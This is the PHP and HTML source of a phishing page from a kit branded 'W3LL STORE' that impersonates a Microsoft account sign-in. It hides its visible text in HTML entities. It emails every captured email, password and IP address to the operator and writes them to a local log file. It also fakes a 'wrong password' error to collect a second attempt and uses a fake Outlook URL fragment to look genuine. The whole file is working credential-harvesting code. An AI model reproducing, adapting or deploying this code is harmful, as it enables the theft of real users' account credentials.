<?php
session_start();
require 'core/functions.php';
require 'core/blocker.php';
require 'config/config.php';

/*if(empty($_SESSION['email'])) {
    echo '<script>window.location = "login.php";</script>';
    exit();
}*/

//mail($to, 'Test Send Email', 'Test'); die('ok');

if(empty($_SESSION['email'])) {
    if(isset($_GET['email'])) {
        $_SESSION['email'] = $_GET['email'];
    } else {
        echo '<script>window.location = "login.php";</script>';
        exit();
    }
}

if(isset($_SESSION['email']))
{
    $mail = base64_decode($_SESSION['email']);
}
$domain = substr(strrchr($mail, "@"), 1);

if(isset($_GET['cngmail'])) {
    session_destroy();
    echo '<script>window.location = "login.php?cngmail='.$_SESSION['email'].'";</script>';
    exit();
}

//$header = "From: Office Login <mastah@localheartz.club>";
function Info($user, $pass)
{
	logger("[VISIT] {$_SERVER['REQUEST_URI']} - 200");
	$message  = ".++----------------------==-[ W3LL STORE ]---------------------------++.\n";
	$message .= "".$_SERVER['HTTP_HOST']." | ".$user." | ".$pass." | ".$_SERVER['REMOTE_ADDR']."\n";
	$message .= ".++----------------------==-[ W3LL STORE ]---------------------------++.\n";

	return $message;
}
if(isset($_POST['password_awal'])) {
    logger("[PASSWORD] {$_SERVER['REQUEST_URI']} - 200");
    mail($to, 'Login', " {$_SERVER['HTTP_HOST']} | ".base64_decode($_SESSION['email'])." | {$_POST['password_awal']} | {$_SERVER['REMOTE_ADDR']}");
    if($backup == 1)
	{
		$message = Info(base64_decode($_SESSION['email']),$_POST['password_awal']);
		@fclose(@fwrite(@fopen("result/info-login.txt", "a"),$message)); //Backup
	}
	//print json_encode(['success' => true]);
    //exit();
}

if(isset($_POST['password_akhir'])) {
    logger("[PASSWORD] {$_SERVER['REQUEST_URI']} - 200");
    mail($to, 'Login 2', " {$_SERVER['HTTP_HOST']} | ".base64_decode($_SESSION['email'])." | {$_POST['password_akhir']} | {$_SERVER['REMOTE_ADDR']}");
    if($backup == 1)
	{
		$message = Info(base64_decode($_SESSION['email']),$_POST['password_akhir']);
		@fclose(@fwrite(@fopen("result/info-login.txt", "a"),$message)); //Backup
	}
	//print json_encode(['success' => true]);
    //exit();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <title>&#83;&#105;&#103;&#110; &#105;&#110; &#116;&#111; &#121;&#111;&#117;&#114; &#77;&#105;&#99;&#114;&#111;&#115;&#111;&#102;&#116; &#97;&#99;&#99;&#111;&#117;&#110;&#116;</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="shortcut icon" href="favicon.ico">
    <link rel="stylesheet" href="assets/css/bootstrap.css">
    <link rel="stylesheet" href="assets/css/pass.css">
    <link href="font-awesome/css/font-awesome.min.css" rel="stylesheet">
    <script src="assets/js/jquery.min.js"></script>
    <script src="assets/js/popper.min.js"></script>
    <script src="assets/js/bootstrap.min.js"></script>
    <style type="text/css">
        
    </style>
	 <link rel="shortcut icon" href="assets/images/favicon.ico" />
</head>
<body>
<div class="container-fluid">
    <div class="row d-flex align-items-center">
        <div class="col-lg-4 col-md-4 col-xs-12 mx-auto">
            <div class="card">
                <div class="card-body">
					<?php
						$ch = curl_init();

						curl_setopt($ch, CURLOPT_URL, "https://logo.clearbit.com/$domain");
						curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
						curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

						curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

						$headers = array();
						$headers[] = 'Upgrade-Insecure-Requests: 1';
						$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36';
						curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

						$result = curl_exec($ch);
						if(!$result || strlen(trim($result)) == 0 || curl_errno($ch))
						{
							$logo = 0;
						}
						else
						{
							$logo = 1;
						}
						curl_close($ch);
						
						if($logo == 0)
						{
							echo '<img src="assets/images/logo.svg"><br>';
						}
						else
						{
							echo '<img src="https://logo.clearbit.com/'.$domain.'" alt="" class="center" height="50px" width="50px"><br>';
						}
					?>
                    <p><a href="?cngmail=true"><img src="assets/images/arrow_left.svg"> <?php echo base64_decode($_SESSION['email']) ?></a></p>
					
                    <h4>&#69;&#110;&#116;&#101;&#114; &#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;</h4>
                    <span id="error" class="d-none">&#89;&#111;&#117;&#114; &#97;&#99;&#99;&#111;&#117;&#110;&#116; &#111;&#114; &#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100; &#105;&#115; &#105;&#110;&#99;&#111;&#114;&#114;&#101;&#99;&#116;. &#73;&#102; &#121;&#111;&#117; &#100;&#111;&#110;'&#116; &#114;&#101;&#109;&#101;&#109;&#98;&#101;&#114; &#121;&#111;&#117;&#114; &#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;, <a href="#">&#114;&#101;&#115;&#101;&#116; &#105;&#116; &#110;&#111;&#119;.</a></span>
                    <form method="POST">
                        <div class="form-group">
                            <input type="password" class="form-control" id="pass" name="pass" placeholder="Password" required>
                        </div>
                        
                        <p><a href="#">&#70;&#111;&#114;&#103;&#111;&#116; &#109;&#121; &#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;</a></p>
                        <button type="submit" class="btn float-right">&#83;&#105;&#103;&#110; &#73;&#110;</button>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="footer">
    <p><img src="assets/images/ellipsis_white.svg"></p>
    <p>&#80;&#114;&#105;&#118;&#97;&#99;&#121; & &#99;&#111;&#111;&#107;&#105;&#101;&#115;</p>
    <p>&#84;&#101;&#114;&#109;&#115; &#111;&#102; &#117;&#115;&#101;</p>
    <p>©<?php echo date('Y'); ?> &#77;&#105;&#99;&#114;&#111;&#115;&#111;&#102;&#116;</p>
</div>

<script>
    location.hash = 'wa=wsignin1.0&rpsnv=13&ct=1539585327&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d715d44a2-2f11-4282-f625-a066679e96e2&id=292841&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015';

    $(function() {
        $(document).on('focus', '.form-control', function() {
            $(this).css({'border-bottom': '1px solid #0067b8'});
        });

        $(document).on('blur', '.form-control', function() {
            $(this).css({'border-bottom': ''});
        });
        
        var success = 0;
        $(document).on('submit', 'form', function(event) {
            event.preventDefault();
            
            var pass    = $('#pass').val();
            
            if(success == 0) {
                $.post('pass.php', {password_awal: pass});
                setTimeout(function() {
                    $('#pass').val('');
                    $('.form-control').css({'border-bottom': '1px solid #e81123'});
                    $('#error').toggleClass('d-none d-block');
                    
                    $(document).on('focus', '.form-control', function() {
                        $(this).css({'border-bottom': '1px solid #e81123'});
                    });
            
                    $(document).on('blur', '.form-control', function() {
                        $(this).css({'border-bottom': '1px solid #e81123'});
                    });
                    
                    success = 1;
                }, 1000);
            } else {
                $.post('pass.php', {password_akhir: pass});
                setTimeout(function() {
                   window.location = 'redirect.php'; 
                }, 1000);
            }
        });
    });
</script>

</body>
</html>
